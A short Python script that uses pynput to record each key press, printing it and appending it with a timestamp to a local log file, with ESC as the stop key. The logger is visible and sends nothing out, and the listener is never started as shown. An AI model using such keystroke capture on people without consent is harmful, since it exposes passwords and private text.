from pynput import keyboard
from datetime import datetime
import os

LOG_FILE = "logs/events.txt"

os.makedirs("logs", exist_ok=True)


def write_log(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        key_data = key.char
    except AttributeError:
        key_data = str(key)

    with open(LOG_FILE, "a", encoding="utf-8") as file:
        file.write(f"[{timestamp}] {key_data}\n")


def on_press(key):
    try:
        print(f"Pressed: {key.char}")
    except AttributeError:
        print(f"Pressed: {key}")

    write_log(key)

    if key == keyboard.Key.esc:
        print("ESC pressed. Stopping logger...")
        return False


listener = keyboard.Listener(on_press=on_press)